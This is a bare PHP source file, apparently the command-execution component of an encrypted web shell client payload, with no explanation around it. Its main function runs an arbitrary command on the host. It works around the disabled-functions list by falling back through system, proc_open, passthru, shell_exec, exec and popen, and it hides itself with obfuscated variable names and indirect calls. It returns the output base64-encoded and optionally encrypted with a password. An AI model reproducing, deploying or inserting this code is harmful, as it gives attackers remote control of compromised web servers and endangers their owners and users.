<?
function getSafeStr($str)
{
    $s1 = iconv('utf-8', 'gbk//IGNORE', $str);
    $s0 = iconv('gbk', 'utf-8//IGNORE', $s1);
    if ($s0 == $str) {
        return $s0;
    } else {
        return iconv('gbk', 'utf-8//IGNORE', $str);
    }
}
function main($command,$pass){
    @set_time_limit(0);
    @ignore_user_abort(1);
    @ini_set('max_execution_time', 0);
    $result = array();
    $PadtJn = @ini_get('disable_functions');
    if (!empty($PadtJn)) {
        $PadtJn = preg_replace('/[, ]+/', ',', $PadtJn);
        $PadtJn = explode(',', $PadtJn);
        $PadtJn = array_map('trim', $PadtJn);
    } else {
        $PadtJn = array();
    }
    if (FALSE !== strpos(strtolower(PHP_OS), 'win')) {
        @putenv("PATH=" . getenv("PATH") . ";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");
        $command = $command . " 2>&1\n";
    } else {
        @putenv("PATH=" . getenv("PATH") . ":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
        $command = $command;
    }
    $JueQDBH = 'is_callable';
    $Bvce = 'in_array';
    if ($JueQDBH('system') and !$Bvce('system', $PadtJn)) {
        ob_start();
        system($command);
        $kWJW = ob_get_contents();
        ob_end_clean();
    } else if ($JueQDBH('proc_open') and !$Bvce('proc_open', $PadtJn)) {
        $handle = proc_open($command, array(
            array(
                'pipe',
                'r'
            ),
            array(
                'pipe',
                'w'
            ),
            array(
                'pipe',
                'w'
            )
        ), $pipes);
        $kWJW = NULL;
        while (!feof($pipes[1])) {
            $kWJW .= fread($pipes[1], 1024);
        }
        @proc_close($handle);
    } else if ($JueQDBH('passthru') and !$Bvce('passthru', $PadtJn)) {
        ob_start();
        passthru($command);
        $kWJW = ob_get_contents();
        ob_end_clean();
    } else if ($JueQDBH('shell_exec') and !$Bvce('shell_exec', $PadtJn)) {
        $kWJW = shell_exec($command);
    } else if ($JueQDBH('exec') and !$Bvce('exec', $PadtJn)) {
        $kWJW = array();
        exec($command, $kWJW);
        $kWJW = join(chr(10), $kWJW) . chr(10);
    } else if ($JueQDBH('exec') and !$Bvce('popen', $PadtJn)) {
        $fp = popen($command, 'r');
        $kWJW = NULL;
        if (is_resource($fp)) {
            while (!feof($fp)) {
                $kWJW .= fread($fp, 1024);
            }
        }
        @pclose($fp);
    } else {
        $kWJW = 0;
        $result["status"] = "fail";
        $result["msg"] = base64_encode("error://");
        return json_encode($result);
    }
    $result["status"] = "ok";
    $result["msg"] = base64_encode(getSafeStr($kWJW));
    $result = json_encode($result);
    echo function_exists("encrypt") ? encrypt($result,$pass) : $result;
}